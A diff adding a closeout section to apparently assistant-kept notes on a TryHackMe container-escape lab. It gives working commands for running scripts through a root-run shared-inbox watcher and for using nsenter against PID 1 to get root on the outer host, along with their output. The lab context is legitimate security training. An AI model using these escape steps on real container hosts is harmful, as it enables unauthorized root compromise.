@@ -205,3 +205,110 @@ This documents different mount namespace propagation views. **Overlay lowerdir e
 - **Failed or unverified:** `nsenter` from helper; exact Level 2 parent Docker settings; Level 3 environment and vulnerability; Level 2 flag *contents*; any complete challenge escape; machine shutdown cause.
 - **Do not confuse:** AttackBox `revshellgenerator` / `cyberchef` inventory with target; local and TLS endpoints with separate daemons; `laughing_galois` (sibling helper) with a new outer layer; `chroot` with namespace entry.
 - **On restart:** Verify target address, prompt, container IDs and daemon identity afresh; ephemeral IPs `10.64.178.175`, `172.17.0.2`, `172.18.0.2` and container IDs are historical, not guaranteed. Rebuild only necessary access and focus new investigation on Level 2's **parent** security context, with careful attribution of which namespace each observation comes from.
+
+
+---
+
+## Final session closeout — Level 3 and host, 2026-11-23
+
+**Provenance:** User-supplied TryHackMe terminal output and uploaded walkthrough screenshot; prior sections remain historically accurate for their earlier checkpoints. The lab machine restarted during investigation, changing ephemeral identifiers. New Level 1 hostname was 3780305806c5; a temporary Alpine helper reported c3bdcb1238cc; the new Docker daemon ID was 17cd1015381d. These values do not overwrite earlier identities.
+
+### Level 2 → Level 3: monitored shared inbox
+
+Level 2 contained world-writable /mnt/level3share/inbox and /mnt/level3share/outbox, mounted as an overlay, with a watcher that picked up submitted shell files. Submission of identity-check.sh was consumed before chmod could run. Its output reported that the watcher-side path /mnt/level3share/outbox did not exist. The watcher-side equivalent is /level3share/outbox, so later scripts wrote to standard output instead of redirecting to an assumed directory.
+
+Working dispatch and response pattern:
+
+~~~sh
+cat > /mnt/level3share/inbox/identity-check2.sh <<'EOF'
+#!/bin/sh
+whoami
+id
+EOF
+cat /mnt/level3share/outbox/identity-check2.sh.out
+~~~
+
+Returned:
+
+~~~text
+root
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+~~~
+
+The transient /tmp/runner_find-host-flag.sh was the watcher's renamed execution copy of our submitted script, not a hidden challenge script. This distinction resolved a misinterpretation during reconnaissance.
+
+### Level 3 flag and failed host searches
+
+Watcher-context find searches found /root/flag_level3.txt and nested Docker overlay/VFS files, including a copy of Level 2's /root/flag_level2.txt under /var/lib/docker/overlay2/.../merged/. A subsequent watcher script read /root/flag_level3.txt, and the user confirmed 'got it'. **Literal flag contents were not pasted into the conversation.** Searches for names or paths containing spaces revealed no host flag because these searches were still in Level 3's mount namespace. Echo's suggestion of a space-containing host path was not confirmed by later evidence.
+
+### Level 3 prerequisites and namespace evidence
+
+The watcher identified as hostname f88dd1e0f27f, UID 0, with nsenter at /usr/bin/nsenter. BusyBox ps did not support the -p option, a tooling issue only. The watcher process and PID 1 had the same PID namespace pid:[4026531836] but different mount namespaces: watcher mnt:[4026532239], PID 1 mnt:[4026531832]. The UTS and network namespaces also differed. The watcher reported:
+
+~~~text
+CapEff: 000001ffffffffff
+CapBnd: 000001ffffffffff
+Seccomp: 0
+~~~
+
+A user-provided walkthrough screenshot described a privileged Level 3 container sharing the host PID namespace and recommended entering PID 1's namespaces. The lab's subsequent independent output verified the transition.
+
+### Final namespace transition — confirmed host execution
+
+A file submitted to the Level 2 inbox was executed by the Level 3 watcher, which invoked:
+
+~~~sh
+nsenter -t 1 -a -- sh -c '
+    echo "Hostname:"
+    hostname
+    echo "Identity:"
+    id
+    echo "Root filesystem:"
+    findmnt -n -o SOURCE,TARGET /
+'
+~~~
+
+The user pasted the exact resulting output:
+
+~~~text
+=== HOST NAMESPACE TEST ===
+Hostname:
+matryoshka
+Identity:
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+Root filesystem:
+/dev/nvme0n1p1 /
+=== COMPLETE ===
+~~~
+
+**Verified finding:** The process entered host namespaces and executed as root on the outer host with hostname matryoshka and root filesystem /dev/nvme0n1p1. The earlier Level 2 helper had failed a similar nsenter attempt due to insufficient privileges; Level 3's elevated capabilities and shared PID namespace were the crucial difference.
+
+### Host flag location and retrieval provenance
+
+The final search was dispatched through the watcher, but the search itself ran after entering the host namespaces:
+
+~~~sh
+nsenter -t 1 -a -- sh -c 'find / -type f -iname "*flag*" 2>/dev/null'
+~~~
+
+The user reported /root/flag_host.txt as the result (typed root/flag_host.txt in the conversation). The assistant then supplied the following retrieval command:
+
+~~~sh
+cat > /mnt/level3share/inbox/read-host-flag.sh <<'EOF'
+#!/bin/sh
+nsenter -t 1 -a -- cat "/root/flag_host.txt"
+EOF
+cat /mnt/level3share/outbox/read-host-flag.sh.out
+~~~
+
+**Verified:** host root shell execution; host flag path user-reported. **Not independently visible in conversation:** host flag contents, final command output, or a TryHackMe submission/completion confirmation. Do not fabricate those records or claim the final flag value was captured. User then moved to the next course section, 'Planning and Scoping'.
+
+### DERP lessons and final state
+
+1. Level 1: Unprivileged container had a world-writable Docker socket despite disabled container networking.
+2. Level 2: Sibling Alpine plus root bind mount and chroot exposed Level 2 files; chroot was not equivalent to switching namespaces. Remote TLS and local Unix-socket Docker APIs were the same Level 2 daemon, not separate escalation paths.
+3. Level 3: World-writable shared inbox was monitored by a root-executing watcher; results were captured via matching outbox .sh.out files. Filesystem paths differed across namespaces.
+4. Host: Privileged Level 3, with host PID namespace access, permitted nsenter against PID 1 and verified execution on the outer host.
+5. Evidence discipline: container root is not automatically host root; failed searches were constrained by the current mount namespace; retain ephemeral context, observed outputs, failed attempts, and unverified flags separately.
+
+**Closeout classification:** Technical escape chain to the outer host **confirmed**. Level 3 flag retrieval **user-confirmed**. Host flag location **user-reported**; value and challenge submission **unverified in the transcript**. GitHub is canonical; local Obsidian sync was not verified.
